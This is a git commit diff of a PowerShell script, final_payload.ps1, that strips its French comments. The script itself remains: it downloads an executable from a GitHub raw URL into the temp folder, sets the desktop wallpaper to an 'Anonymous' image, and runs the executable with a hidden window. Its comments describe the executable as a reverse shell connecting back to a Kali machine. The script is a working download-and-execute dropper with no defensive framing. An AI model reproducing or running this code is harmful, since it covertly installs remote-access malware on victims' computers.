ad4b99bac5e7b3b4c5ae951023bfb287f620ab28
FogBound <raphael.barbault@gmail.com>
2025-11-19 09:49:19 +0100

    Update final_payload.ps1

--- final_payload.ps1
+++ final_payload.ps1
@@ -1,23 +1,17 @@
-# final_payload.ps1 - Gère l'exécution du payload et le changement de fond d'écran
-
-# --- 0. Définition des Chemins et URLs ---
 $TempPath = "$env:TEMP"
 $PayloadUrl = "https://raw.githubusercontent.com/FogBound-IT/test/main/final_payload.exe"
 $ImageAnonUrl = "https://raw.githubusercontent.com/FogBound-IT/test/793235c441ddaec513ddb5699b33a2cff3b285aa/thumb-1920-423529.jpg"
 $PayloadDest = "$TempPath\pld.exe"
 $ImageDest = "$TempPath\anonymous.jpg"
 
-# --- 1. Télécharger l'image Anonymous ---
 Try {
     Invoke-WebRequest -Uri $ImageAnonUrl -OutFile $ImageDest -ErrorAction Stop
 } Catch { Exit 1 }
 
-# --- 2. Télécharger le payload (connexion Kali) ---
 Try {
     Invoke-WebRequest -Uri $PayloadUrl -OutFile $PayloadDest -ErrorAction Stop
 } Catch { Exit 1 }
 
-# --- 3. Définir le fond d'écran via C# (Méthode robuste) ---
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -38,9 +32,8 @@ Try {
     [Wallpaper]::SetDesktopWallpaper($ImageDest)
 } Catch {}
 
-# --- 4. Lancer le payload (Connexion à la Kali) de manière discrète ---
-# L'utilisation de Start-Process avec la propriété -WindowStyle Hidden garantit que le payload
 # s'exécute en arrière-plan sans fenêtre visible, ce qui est idéal pour un reverse shell.
 Start-Process -FilePath $PayloadDest -WindowStyle Hidden
+
 
 # Le script se termine ici.
